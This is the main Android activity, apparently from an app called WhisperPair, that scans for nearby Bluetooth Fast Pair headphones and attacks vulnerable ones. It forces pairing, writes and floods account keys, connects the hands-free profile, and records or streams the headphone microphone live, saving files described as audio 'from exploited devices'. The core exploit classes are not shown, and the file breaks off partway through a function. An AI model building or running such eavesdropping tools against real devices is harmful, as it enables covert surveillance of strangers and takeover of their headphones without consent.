package com.zalexdev.whisperpair

import com.zalexdev.whisperpair.R
import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioTrack
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.animateColorAsState
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.rotate
import androidx.compose.ui.draw.scale
import androidx.compose.foundation.Image
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalUriHandler
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import com.zalexdev.whisperpair.ui.theme.*
import java.io.File
import java.io.FileInputStream
import java.text.SimpleDateFormat
import java.util.*
import kotlin.concurrent.thread

class MainActivity : ComponentActivity() {
    private var scanner: Scanner? = null
    private var tester: VulnerabilityTester? = null
    private var exploit: FastPairExploit? = null
    private var audioManager: BluetoothAudioManager? = null
    private val devices = mutableStateListOf<FastPairDevice>()
    private val exploitResults = mutableStateMapOf<String, String>()
    private val audioStates = mutableStateMapOf<String, AudioConnectionState>()
    private val pairedDevices = mutableStateListOf<String>()  // Track successfully paired devices
    private var hasShownFirstFailWarning = false
    private val showUnpairWarning = mutableStateOf(false)

    data class AudioConnectionState(
        val isConnected: Boolean = false,
        val isRecording: Boolean = false,
        val isListening: Boolean = false,
        val recordingFile: String? = null,
        val message: String? = null
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        val bluetoothManager = getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        val bluetoothAdapter = bluetoothManager?.adapter

        tester = VulnerabilityTester(this)
        exploit = FastPairExploit(this)
        audioManager = BluetoothAudioManager(this)

        audioManager?.initialize { ready ->
            if (ready) {
                android.util.Log.d("WhisperPair", "Audio manager initialized")
            }
        }

        scanner = Scanner(bluetoothAdapter) { device ->
            runOnUiThread {
                val index = devices.indexOfFirst { it.address == device.address }
                if (index == -1) {
                    devices.add(device)
                } else {
                    val currentStatus = devices[index].status
                    devices[index] = device.copy(status = currentStatus)
                }
            }
        }

        setContent {
            WhisperPairTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = DarkBackground
                ) {
                    WhisperPairApp(
                        context = this@MainActivity,
                        devices = devices,
                        exploitResults = exploitResults,
                        audioStates = audioStates,
                        pairedDevices = pairedDevices,
                        showUnpairWarning = showUnpairWarning.value,
                        onDismissUnpairWarning = { showUnpairWarning.value = false },
                        recordingsDir = getExternalFilesDir(null) ?: filesDir,
                        onScanToggle = { isScanning ->
                            if (isScanning) scanner?.startScanning() else scanner?.stopScanning()
                        },
                        onTestDevice = { device -> testDevice(device) },
                        onClearDevices = {
                            devices.clear()
                            exploitResults.clear()
                            audioStates.clear()
                        },
                        onExploitDevice = { device -> exploitDevice(device) },
                        onWriteAccountKey = { device -> writeAccountKey(device) },
                        onFloodKeys = { device -> floodAccountKeys(device) },
                        onConnectHfp = { device -> connectHfp(device) },
                        onStartRecording = { device -> startRecording(device) },
                        onStopRecording = { device -> stopRecording(device) },
                        onStartListening = { device -> startListening(device) },
                        onStopListening = { device -> stopListening(device) }
                    )
                }
            }
        }
    }

    private fun testDevice(device: FastPairDevice) {
        val index = devices.indexOfFirst { it.address == device.address }
        if (index != -1) {
            devices[index] = devices[index].copy(status = DeviceStatus.TESTING)
            tester?.testDevice(device.address) { status ->
                runOnUiThread {
                    val newIndex = devices.indexOfFirst { it.address == device.address }
                    if (newIndex != -1) {
                        devices[newIndex] = devices[newIndex].copy(status = status)

                        // Show first-fail warning if device is patched/error and we haven't shown it yet
                        if (!hasShownFirstFailWarning && (status == DeviceStatus.PATCHED || status == DeviceStatus.ERROR)) {
                            hasShownFirstFailWarning = true
                            showUnpairWarning.value = true
                        }
                    }
                }
            }
        }
    }

    private fun exploitDevice(device: FastPairDevice) {
        exploitResults[device.address] = "Connecting..."

        exploit?.exploit(device.address) { result ->
            runOnUiThread {
                when (result) {
                    is FastPairExploit.ExploitResult.Success -> {
                        exploitResults[device.address] = "PAIRED! BR/EDR: ${result.brEdrAddress}"
                        if (!pairedDevices.contains(device.address)) pairedDevices.add(device.address)
                    }
                    is FastPairExploit.ExploitResult.PartialSuccess -> {
                        exploitResults[device.address] = "PARTIAL: ${result.brEdrAddress} - ${result.message}"
                        if (!pairedDevices.contains(device.address)) pairedDevices.add(device.address)
                    }
                    is FastPairExploit.ExploitResult.Failed -> {
                        exploitResults[device.address] = "FAILED: ${result.reason}"
                    }
                    is FastPairExploit.ExploitResult.AccountKeyResult -> {
                        exploitResults[device.address] = if (result.success) "KEY: ${result.message}" else "FAILED: ${result.message}"
                    }
                    else -> {}
                }
            }
        }
    }

    private fun writeAccountKey(device: FastPairDevice) {
        exploitResults[device.address] = "Writing account key..."

        exploit?.writeAccountKeyDirect(device.address) { result ->
            runOnUiThread {
                when (result) {
                    is FastPairExploit.ExploitResult.AccountKeyResult -> {
                        exploitResults[device.address] = if (result.success)
                            "KEY WRITTEN! Device registered."
                        else
                            "KEY FAILED: ${result.message}"
                    }
                    else -> exploitResults[device.address] = "Unexpected result"
                }
            }
        }
    }

    private fun floodAccountKeys(device: FastPairDevice) {
        exploitResults[device.address] = "Flooding: 0/10..."

        exploit?.floodAccountKeys(device.address, 10) { current, total, done ->
            runOnUiThread {
                exploitResults[device.address] = if (done) "FLOOD: $current/$total done" else "Flooding: $current/$total..."
            }
        }
    }

    private fun connectHfp(device: FastPairDevice) {
        val am = audioManager ?: return
        audioStates[device.address] = AudioConnectionState(message = "Connecting HFP...")

        am.connectAudioProfile(device.address) { state ->
            runOnUiThread {
                when (state) {
                    is BluetoothAudioManager.AudioState.Connected -> {
                        audioStates[device.address] = AudioConnectionState(
                            isConnected = true,
                            message = "HFP connected - ready for audio"
                        )
                    }
                    is BluetoothAudioManager.AudioState.Error -> {
                        audioStates[device.address] = AudioConnectionState(message = "HFP: ${state.message}")
                    }
                    else -> {}
                }
            }
        }
    }

    private fun startRecording(device: FastPairDevice) {
        val am = audioManager ?: return
        val outputDir = getExternalFilesDir(null) ?: filesDir

        audioStates[device.address] = audioStates[device.address]?.copy(
            isRecording = true, message = "Recording..."
        ) ?: AudioConnectionState(isRecording = true, message = "Recording...")

        am.startRecording(
            outputDir = outputDir,
            onStateChange = { state ->
                runOnUiThread {
                    when (state) {
                        is BluetoothAudioManager.AudioState.Recording -> {
                            audioStates[device.address] = audioStates[device.address]?.copy(
                                isRecording = true, message = "Recording microphone..."
                            ) ?: AudioConnectionState(isRecording = true)
                        }
                        is BluetoothAudioManager.AudioState.Error -> {
                            audioStates[device.address] = audioStates[device.address]?.copy(
                                isRecording = false, message = "Error: ${state.message}"
                            ) ?: AudioConnectionState(message = state.message)
                        }
                        else -> {}
                    }
                }
            },
            onRecordingComplete = { info ->
                runOnUiThread {
                    val duration = info.durationMs / 1000
                    audioStates[device.address] = audioStates[device.address]?.copy(
                        isRecording = false,
                        recordingFile = info.file.absolutePath,
                        message = "Saved: ${info.file.name} (${duration}s)"
                    ) ?: AudioConnectionState(recordingFile = info.file.absolutePath)
                }
            }
        )
    }

    private fun stopRecording(device: FastPairDevice) {
        audioManager?.stopRecording()
    }

    private fun startListening(device: FastPairDevice) {
        val am = audioManager ?: return

        audioStates[device.address] = audioStates[device.address]?.copy(
            isListening = true, message = "Starting live audio..."
        ) ?: AudioConnectionState(isListening = true, message = "Starting...")

        am.startListening { state ->
            runOnUiThread {
                when (state) {
                    is BluetoothAudioManager.AudioState.Listening -> {
                        audioStates[device.address] = audioStates[device.address]?.copy(
                            isListening = true, message = "LIVE - Listening to microphone"
                        ) ?: AudioConnectionState(isListening = true)
                    }
                    is BluetoothAudioManager.AudioState.Error -> {
                        audioStates[device.address] = audioStates[device.address]?.copy(
                            isListening = false, message = "Error: ${state.message}"
                        ) ?: AudioConnectionState(message = state.message)
                    }
                    is BluetoothAudioManager.AudioState.Connected -> {
                        audioStates[device.address] = audioStates[device.address]?.copy(
                            isListening = false, message = "Stopped listening"
                        ) ?: AudioConnectionState(isConnected = true)
                    }
                    else -> {}
                }
            }
        }
    }

    private fun stopListening(device: FastPairDevice) {
        audioManager?.stopListening()
        audioStates[device.address] = audioStates[device.address]?.copy(
            isListening = false, message = "Stopped"
        ) ?: AudioConnectionState()
    }

    override fun onDestroy() {
        super.onDestroy()
        scanner?.stopScanning()
        audioManager?.release()
    }
}

enum class Screen { Scanner, Recordings }

private const val PREFS_NAME = "whisperpair_prefs"
private const val KEY_DISCLAIMER_ACCEPTED = "disclaimer_accepted"

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun WhisperPairApp(
    context: Context,
    devices: List<FastPairDevice>,
    exploitResults: Map<String, String>,
    audioStates: Map<String, MainActivity.AudioConnectionState>,
    pairedDevices: List<String>,
    showUnpairWarning: Boolean,
    onDismissUnpairWarning: () -> Unit,
    recordingsDir: File,
    onScanToggle: (Boolean) -> Unit,
    onTestDevice: (FastPairDevice) -> Unit,
    onClearDevices: () -> Unit,
    onExploitDevice: (FastPairDevice) -> Unit,
    onWriteAccountKey: (FastPairDevice) -> Unit,
    onFloodKeys: (FastPairDevice) -> Unit,
    onConnectHfp: (FastPairDevice) -> Unit,
    onStartRecording: (FastPairDevice) -> Unit,
    onStopRecording: (FastPairDevice) -> Unit,
    onStartListening: (FastPairDevice) -> Unit,
    onStopListening: (FastPairDevice) -> Unit
) {
    val prefs = remember { context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE) }
    var currentScreen by remember { mutableStateOf(Screen.Scanner) }
    var showAboutDialog by remember { mutableStateOf(false) }
    var showDisclaimerDialog by remember { mutableStateOf(!prefs.getBoolean(KEY_DISCLAIMER_ACCEPTED, false)) }

    Scaffold(
        bottomBar = {
            NavigationBar(containerColor = DarkSurface) {
                NavigationBarItem(
                    selected = currentScreen == Screen.Scanner,
                    onClick = { currentScreen = Screen.Scanner },
                    icon = { Icon(Icons.Default.BluetoothSearching, contentDescription = null) },
                    label = { Text("Scanner") },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = CyanPrimary,
                        selectedTextColor = CyanPrimary,
                        indicatorColor = CyanPrimary.copy(alpha = 0.2f)
                    )
                )
                NavigationBarItem(
                    selected = currentScreen == Screen.Recordings,
                    onClick = { currentScreen = Screen.Recordings },
                    icon = { Icon(Icons.Default.Audiotrack, contentDescription = null) },
                    label = { Text("Recordings") },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = CyanPrimary,
                        selectedTextColor = CyanPrimary,
                        indicatorColor = CyanPrimary.copy(alpha = 0.2f)
                    )
                )
            }
        },
        containerColor = DarkBackground
    ) { paddingValues ->
        when (currentScreen) {
            Screen.Scanner -> ScannerScreen(
                devices = devices,
                exploitResults = exploitResults,
                audioStates = audioStates,
                pairedDevices = pairedDevices,
                paddingValues = paddingValues,
                onScanToggle = onScanToggle,
                onTestDevice = onTestDevice,
                onClearDevices = onClearDevices,
                onExploitDevice = onExploitDevice,
                onWriteAccountKey = onWriteAccountKey,
                onFloodKeys = onFloodKeys,
                onConnectHfp = onConnectHfp,
                onStartRecording = onStartRecording,
                onStopRecording = onStopRecording,
                onStartListening = onStartListening,
                onStopListening = onStopListening,
                onShowAbout = { showAboutDialog = true }
            )
            Screen.Recordings -> RecordingsScreen(
                recordingsDir = recordingsDir,
                paddingValues = paddingValues
            )
        }
    }

    if (showAboutDialog) {
        AboutDialog(onDismiss = { showAboutDialog = false })
    }

    if (showDisclaimerDialog) {
        DisclaimerDialog(onAccept = {
            prefs.edit().putBoolean(KEY_DISCLAIMER_ACCEPTED, true).apply()
            showDisclaimerDialog = false
        })
    }

    if (showUnpairWarning) {
        UnpairWarningDialog(onDismiss = onDismissUnpairWarning)
    }
}

@Composable
fun UnpairWarningDialog(onDismiss: () -> Unit) {
    AlertDialog(
        onDismissRequest = onDismiss,
        icon = { Icon(Icons.Default.BluetoothDisabled, null, tint = WarningOrange, modifier = Modifier.size(48.dp)) },
        title = { Text("Device May Be Already Paired", textAlign = TextAlign.Center, fontWeight = FontWeight.Bold) },
        text = {
            Column {
                Text("The test failed. This could mean:", style = MaterialTheme.typography.bodyMedium)
                Spacer(Modifier.height(12.dp))
                BulletPoint("The device is already paired in your phone's Bluetooth settings")
                BulletPoint("The device firmware is patched")
                BulletPoint("The device doesn't support Fast Pair")
                Spacer(Modifier.height(16.dp))
                Text("To test properly:", style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.SemiBold, color = CyanPrimary)
                Spacer(Modifier.height(8.dp))
                Text("1. Go to Settings → Bluetooth", style = MaterialTheme.typography.bodySmall)
                Text("2. Find the device and tap 'Forget' or 'Unpair'", style = MaterialTheme.typography.bodySmall)
                Text("3. Return here and test again", style = MaterialTheme.typography.bodySmall)
                Spacer(Modifier.height(12.dp))
                Text("Android remembers paired devices and won't allow new pairing attempts.", style = MaterialTheme.typography.labelSmall, color = TextSecondary)
            }
        },
        confirmButton = { Button(onClick = onDismiss, colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)) { Text("Got It") } },
        containerColor = DarkSurface
    )
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ScannerScreen(
    devices: List<FastPairDevice>,
    exploitResults: Map<String, String>,
    audioStates: Map<String, MainActivity.AudioConnectionState>,
    pairedDevices: List<String>,
    paddingValues: PaddingValues,
    onScanToggle: (Boolean) -> Unit,
    onTestDevice: (FastPairDevice) -> Unit,
    onClearDevices: () -> Unit,
    onExploitDevice: (FastPairDevice) -> Unit,
    onWriteAccountKey: (FastPairDevice) -> Unit,
    onFloodKeys: (FastPairDevice) -> Unit,
    onConnectHfp: (FastPairDevice) -> Unit,
    onStartRecording: (FastPairDevice) -> Unit,
    onStopRecording: (FastPairDevice) -> Unit,
    onStartListening: (FastPairDevice) -> Unit,
    onStopListening: (FastPairDevice) -> Unit,
    onShowAbout: () -> Unit
) {
    var isScanning by remember { mutableStateOf(false) }
    var showPermissionDeniedDialog by remember { mutableStateOf(false) }
    var showBluetoothDisabledDialog by remember { mutableStateOf(false) }
    val context = LocalContext.current

    val permissions = remember {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            arrayOf(Manifest.permission.BLUETOOTH_SCAN, Manifest.permission.BLUETOOTH_CONNECT, Manifest.permission.RECORD_AUDIO)
        } else {
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.BLUETOOTH, Manifest.permission.BLUETOOTH_ADMIN, Manifest.permission.RECORD_AUDIO)
        }
    }

    fun hasAllPermissions() = permissions.all { ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED }
    fun isBluetoothEnabled() = (context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter?.isEnabled == true

    val permissionLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { results ->
        if (results.all { it.value }) {
            if (isBluetoothEnabled()) { isScanning = true; onScanToggle(true) }
            else showBluetoothDisabledDialog = true
        } else showPermissionDeniedDialog = true
    }

    val bluetoothEnableLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        if (isBluetoothEnabled()) { isScanning = true; onScanToggle(true) }
    }

    fun startScan() {
        when {
            !hasAllPermissions() -> permissionLauncher.launch(permissions)
            !isBluetoothEnabled() -> showBluetoothDisabledDialog = true
            else -> { isScanning = true; onScanToggle(true) }
        }
    }

    Column(modifier = Modifier.fillMaxSize().padding(paddingValues).padding(horizontal = 16.dp)) {
        // Header
        Row(
            modifier = Modifier.fillMaxWidth().padding(vertical = 12.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Default.Security, contentDescription = null, tint = CyanPrimary, modifier = Modifier.size(28.dp))
                Spacer(Modifier.width(12.dp))
                Column {
                    Text("Headphone Test", fontWeight = FontWeight.Bold, fontSize = 20.sp, color = TextPrimary)
                    Text("Compiled by Leeroy", fontSize = 11.sp, color = CyanPrimary)
                }
            }
            IconButton(onClick = onShowAbout) {
                Icon(Icons.Outlined.Info, contentDescription = "About", tint = TextSecondary)
            }
        }

        ScanControlCard(isScanning = isScanning, deviceCount = devices.size, onToggleScan = {
            if (!isScanning) startScan() else { isScanning = false; onScanToggle(false) }
        })

        Spacer(Modifier.height(16.dp))

        if (devices.isNotEmpty()) {
            OutlinedButton(onClick = onClearDevices, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.outlinedButtonColors(contentColor = TextSecondary)) {
                Icon(Icons.Default.Clear, null, Modifier.size(18.dp))
                Spacer(Modifier.width(4.dp))
                Text("Clear All Devices")
            }
            Spacer(Modifier.height(16.dp))
        }

        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text("Discovered Devices", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.SemiBold, color = TextPrimary)
            if (devices.isNotEmpty()) Text("${devices.size} found", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
        }

        Spacer(Modifier.height(8.dp))

        if (devices.isEmpty()) {
            EmptyStateCard(isScanning)
        } else {
            LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp), modifier = Modifier.weight(1f)) {
                items(devices.sortedByDescending { it.rssi }) { device ->
                    DeviceCard(
                        device = device,
                        exploitResult = exploitResults[device.address],
                        audioState = audioStates[device.address],
                        isPaired = pairedDevices.contains(device.address),
                        onTest = { onTestDevice(device) },
                        onExploit = { onExploitDevice(device) },
                        onWriteAccountKey = { onWriteAccountKey(device) },
                        onFloodKeys = { onFloodKeys(device) },
                        onConnectHfp = { onConnectHfp(device) },
                        onStartRecording = { onStartRecording(device) },
                        onStopRecording = { onStopRecording(device) },
                        onStartListening = { onStartListening(device) },
                        onStopListening = { onStopListening(device) }
                    )
                }
                item { Spacer(Modifier.height(8.dp)) }
            }
        }
    }

    if (showPermissionDeniedDialog) {
        AlertDialog(
            onDismissRequest = { showPermissionDeniedDialog = false },
            icon = { Icon(Icons.Default.PermDeviceInformation, null, tint = WarningOrange, modifier = Modifier.size(48.dp)) },
            title = { Text("Permissions Required", fontWeight = FontWeight.Bold) },
            text = { Text("WhisperPair needs Bluetooth and Microphone permissions to function.") },
            confirmButton = {
                Button(onClick = {
                    showPermissionDeniedDialog = false
                    context.startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.fromParts("package", context.packageName, null)
                    })
                }, colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)) { Text("Open Settings") }
            },
            dismissButton = { TextButton(onClick = { showPermissionDeniedDialog = false }) { Text("Cancel", color = TextSecondary) } },
            containerColor = DarkSurface
        )
    }

    if (showBluetoothDisabledDialog) {
        AlertDialog(
            onDismissRequest = { showBluetoothDisabledDialog = false },
            icon = { Icon(Icons.Default.BluetoothDisabled, null, tint = WarningOrange, modifier = Modifier.size(48.dp)) },
            title = { Text("Bluetooth Disabled", fontWeight = FontWeight.Bold) },
            text = { Text("Please enable Bluetooth to scan for devices.") },
            confirmButton = {
                Button(onClick = {
                    showBluetoothDisabledDialog = false
                    bluetoothEnableLauncher.launch(Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE))
                }, colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)) { Text("Enable") }
            },
            dismissButton = { TextButton(onClick = { showBluetoothDisabledDialog = false }) { Text("Cancel", color = TextSecondary) } },
            containerColor = DarkSurface
        )
    }
}

@Composable
fun RecordingsScreen(recordingsDir: File, paddingValues: PaddingValues) {
    val context = LocalContext.current
    var recordings by remember { mutableStateOf(listOf<File>()) }
    var playingFile by remember { mutableStateOf<String?>(null) }
    var audioTrack by remember { mutableStateOf<AudioTrack?>(null) }
    var mediaPlayer by remember { mutableStateOf<MediaPlayer?>(null) }

    LaunchedEffect(Unit) {
        recordings = recordingsDir.listFiles()?.filter {
            it.name.startsWith("whisper_") && (it.name.endsWith(".pcm") || it.name.endsWith(".m4a"))
        }?.sortedByDescending { it.lastModified() } ?: emptyList()
    }

    fun refreshRecordings() {
        recordings = recordingsDir.listFiles()?.filter {
            it.name.startsWith("whisper_") && (it.name.endsWith(".pcm") || it.name.endsWith(".m4a"))
        }?.sortedByDescending { it.lastModified() } ?: emptyList()
    }

    fun stopPlaying() {
        playingFile = null
        audioTrack?.stop()
        audioTrack?.release()
        audioTrack = null
        mediaPlayer?.stop()
        mediaPlayer?.release()
        mediaPlayer = null
    }

    fun playFile(file: File) {
        stopPlaying()
        playingFile = file.absolutePath

        if (file.name.endsWith(".m4a")) {
            // Use MediaPlayer for M4A files
            try {
                val player = MediaPlayer().apply {
                    setDataSource(file.absolutePath)
                    setOnCompletionListener {
                        playingFile = null
                        release()
                        mediaPlayer = null
                    }
                    setOnErrorListener { _, _, _ ->
                        playingFile = null
                        release()
                        mediaPlayer = null
                        true
                    }
                    prepare()
                    start()
                }
                mediaPlayer = player
            } catch (e: Exception) {
                playingFile = null
            }
        } else {
            // Use AudioTrack for raw PCM files
            thread {
                try {
                    val bufferSize = AudioTrack.getMinBufferSize(16000, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT)
                    val track = AudioTrack.Builder()
                        .setAudioAttributes(AudioAttributes.Builder().setUsage(AudioAttributes.USAGE_MEDIA).setContentType(AudioAttributes.CONTENT_TYPE_SPEECH).build())
                        .setAudioFormat(AudioFormat.Builder().setEncoding(AudioFormat.ENCODING_PCM_16BIT).setSampleRate(16000).setChannelMask(AudioFormat.CHANNEL_OUT_MONO).build())
                        .setBufferSizeInBytes(bufferSize)
                        .setTransferMode(AudioTrack.MODE_STREAM)
                        .build()
                    audioTrack = track
                    track.play()

                    FileInputStream(file).use { fis ->
                        val buffer = ByteArray(bufferSize)
                        var bytesRead: Int
                        while (fis.read(buffer).also { bytesRead = it } != -1 && playingFile == file.absolutePath) {
                            track.write(buffer, 0, bytesRead)
                        }
                    }
                    track.stop()
                    track.release()
                    playingFile = null
                } catch (e: Exception) {
                    playingFile = null
                }
            }
        }
    }

    fun shareFile(file: File) {
        val uri = FileProvider.getUriForFile(context, "${context.packageName}.provider", file)
        val intent = Intent(Intent.ACTION_SEND).apply {
            type = "audio/*"
            putExtra(Intent.EXTRA_STREAM, uri)
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        }
        context.startActivity(Intent.createChooser(intent, "Share recording"))
    }

    fun deleteFile(file: File) {
        stopPlaying()
        file.delete()
        refreshRecordings()
    }

    Column(modifier = Modifier.fillMaxSize().padding(paddingValues).padding(horizontal = 16.dp)) {
        Row(modifier = Modifier.fillMaxWidth().padding(vertical = 16.dp), verticalAlignment = Alignment.CenterVertically) {
            Icon(Icons.Default.Audiotrack, null, tint = CyanPrimary, modifier = Modifier.size(28.dp))
            Spacer(Modifier.width(12.dp))
            Text("Recordings", fontWeight = FontWeight.Bold, fontSize = 20.sp, color = TextPrimary)
            Spacer(Modifier.weight(1f))
            IconButton(onClick = { refreshRecordings() }) {
                Icon(Icons.Default.Refresh, "Refresh", tint = TextSecondary)
            }
        }

        if (recordings.isEmpty()) {
            Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = DarkSurface), shape = RoundedCornerShape(16.dp)) {
                Column(modifier = Modifier.fillMaxWidth().padding(32.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(Icons.Default.AudioFile, null, tint = TextSecondary, modifier = Modifier.size(64.dp))
                    Spacer(Modifier.height(16.dp))
                    Text("No recordings yet", style = MaterialTheme.typography.titleMedium, color = TextPrimary)
                    Text("Use the Scanner tab to record audio from exploited devices", style = MaterialTheme.typography.bodySmall, color = TextSecondary, textAlign = TextAlign.Center)
                }
            }
        } else {
            LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                items(recordings) { file ->
                    val isPlaying = playingFile == file.absolutePath
                    val dateFormat = SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.US)
                    val date = dateFormat.format(Date(file.lastModified()))
                    val sizeKb = file.length() / 1024

                    Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = DarkSurface), shape = RoundedCornerShape(12.dp)) {
                        Row(modifier = Modifier.fillMaxWidth().padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                            Box(
                                modifier = Modifier.size(48.dp).clip(CircleShape).background(if (isPlaying) PatchedGreen.copy(alpha = 0.2f) else CyanPrimary.copy(alpha = 0.15f)),
                                contentAlignment = Alignment.Center
                            ) {
                                Icon(if (isPlaying) Icons.Default.GraphicEq else Icons.Default.AudioFile, null, tint = if (isPlaying) PatchedGreen else CyanPrimary, modifier = Modifier.size(24.dp))
                            }
                            Spacer(Modifier.width(12.dp))
                            Column(modifier = Modifier.weight(1f)) {
                                Text(file.name, style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.Medium, color = TextPrimary, maxLines = 1, overflow = TextOverflow.Ellipsis)
                                Text("$date • ${sizeKb}KB", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
                            }
                            IconButton(onClick = { if (isPlaying) stopPlaying() else playFile(file) }) {
                                Icon(if (isPlaying) Icons.Default.Stop else Icons.Default.PlayArrow, null, tint = if (isPlaying) VulnerableRed else PatchedGreen)
                            }
                            IconButton(onClick = { shareFile(file) }) {
                                Icon(Icons.Default.Share, "Share", tint = CyanPrimary)
                            }
                            IconButton(onClick = { deleteFile(file) }) {
                                Icon(Icons.Default.Delete, "Delete", tint = VulnerableRed)
                            }
                        }
                    }
                }
                item { Spacer(Modifier.height(8.dp)) }
            }
        }
    }
}

@Composable
fun ScanControlCard(isScanning: Boolean, deviceCount: Int, onToggleScan: () -> Unit) {
    val infiniteTransition = rememberInfiniteTransition(label = "scan")
    val rotation by infiniteTransition.animateFloat(0f, 360f, infiniteRepeatable(tween(2000, easing = LinearEasing), RepeatMode.Restart), label = "rotation")
    val pulse by infiniteTransition.animateFloat(1f, 1.2f, infiniteRepeatable(tween(1000), RepeatMode.Reverse), label = "pulse")

    Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = DarkSurface), shape = RoundedCornerShape(16.dp)) {
        Row(modifier = Modifier.fillMaxWidth().padding(16.dp), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(12.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                Box(modifier = Modifier.size(48.dp).clip(CircleShape).background(if (isScanning) CyanPrimary.copy(alpha = 0.2f) else DarkSurfaceVariant), contentAlignment = Alignment.Center) {
                    Icon(Icons.Default.BluetoothSearching, null, tint = if (isScanning) CyanPrimary else TextSecondary, modifier = Modifier.size(24.dp).then(if (isScanning) Modifier.rotate(rotation) else Modifier))
                }
                Spacer(Modifier.width(12.dp))
                Column(modifier = Modifier.weight(1f)) {
                    Text(if (isScanning) "Scanning..." else "Ready to Scan", style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.SemiBold, color = TextPrimary, maxLines = 1)
                    Text(if (isScanning) "Looking for Fast Pair devices" else "Tap to discover nearby devices", style = MaterialTheme.typography.bodySmall, color = TextSecondary, maxLines = 1)
                }
            }
            Button(onClick = onToggleScan, colors = ButtonDefaults.buttonColors(containerColor = if (isScanning) VulnerableRed else CyanPrimary), shape = RoundedCornerShape(12.dp), modifier = if (isScanning) Modifier.scale(pulse) else Modifier) {
                Icon(if (isScanning) Icons.Default.Stop else Icons.Default.PlayArrow, null, Modifier.size(20.dp))
                Spacer(Modifier.width(4.dp))
                Text(if (isScanning) "Stop" else "Scan")
            }
        }
    }
}

@Composable
fun DeviceCard(
    device: FastPairDevice,
    exploitResult: String?,
    audioState: MainActivity.AudioConnectionState?,
    isPaired: Boolean,
    onTest: () -> Unit,
    onExploit: () -> Unit,
    onWriteAccountKey: () -> Unit,
    onFloodKeys: () -> Unit,
    onConnectHfp: () -> Unit,
    onStartRecording: () -> Unit,
    onStopRecording: () -> Unit,
    onStartListening: () -> Unit,
    onStopListening: () -> Unit
) {
    val statusColor by animateColorAsState(
        when (device.status) {
            DeviceStatus.VULNERABLE -> VulnerableRed
            DeviceStatus.PATCHED -> PatchedGreen
